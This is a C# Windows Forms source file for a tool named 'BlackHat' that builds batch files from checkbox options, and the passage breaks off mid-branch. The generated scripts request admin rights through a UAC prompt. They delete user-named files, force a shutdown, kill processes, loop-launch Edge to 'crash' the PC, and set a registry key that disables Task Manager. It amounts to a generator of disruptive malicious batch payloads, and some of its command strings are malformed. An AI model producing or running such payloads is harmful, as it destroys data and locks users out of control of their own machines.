using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace BlackHat
{
    public partial class BlackHat : Form
    {
        //updates
        string CurrentVersion = "1.0";

        public BlackHat()
        {
            InitializeComponent();
        }

        private void BlackHat_Load(object sender, EventArgs e)
        {
            MaximizeBox = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Make Sure To Only Check Two Boxes At One Time As The Tool Wont Work.","Warning",MessageBoxButtons.OK,MessageBoxIcon.Information);
            MessageBox.Show("Make sure to add .bat after naming the file.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);

            if (CustomBATcheck.Checked)
            {
                SaveFileDialog saveFileDialog1= new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK) 
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName,FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n" + richTextBox1.Text + "\n");//custom batch code

                        if(ShutdownBox.Checked)//shutsdown PC
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (FileCheck.Checked)//deletes files
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n\\ndel \"" + deltext.Text+"\n");
                        }
                        else
                        if (AppCheck.Checked)//starts app
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)//kills any task
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else if (CrashCheck.Checked)//crashes pc
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else if (MessageCheck.Checked)//send message
                        {
                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\""+Messagetext.Text+"\"");
                        }
                        else if (DisableTaskCheck.Checked)//disables taskmanager
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                    }
                }
            }
            else
            if(ShutdownBox.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\nshutdown\", \"/s /t 0\n");

                        if (FileCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n\\ndel \"" + deltext.Text + "\n");
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text + "");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write("@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n" + richTextBox1.Text + "\n");
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else if (MessageCheck.Checked)
                        {
                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
                        }
                        else if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                    }
                }
            }
            else
            if(AppCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\nstart " + Apptext.Text);

                        if (FileCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n\\ndel \"" + deltext.Text + "\n");
                        }
                        else
                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write("@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n" + richTextBox1.Text + "\n");
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else if (MessageCheck.Checked)
                        {
                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
                        }
                        else if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                    }
                }
            }
            else
            if (FileCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n\\ndel \"" + deltext.Text + "\n");

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write("@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n" + richTextBox1.Text + "\n");
                        }
                        else
                        if(AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else if (MessageCheck.Checked)
                        {
                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
                        }
                        else if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                    }
                }
            }
            else
            if (Taskkillcheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\ntaskkill /f /im " + AppNameBox.Text);

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write("@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n" + richTextBox1.Text + "\n");
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if(FileCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n\\ndel \"" + deltext.Text + "\n");
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
                        }
                        else if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                    }
                }
            }
            else
            if (CrashCheck.Checked) 
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write("@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n" + richTextBox1.Text + "\n");
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (FileCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n\\ndel \"" + deltext.Text + "\n");
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
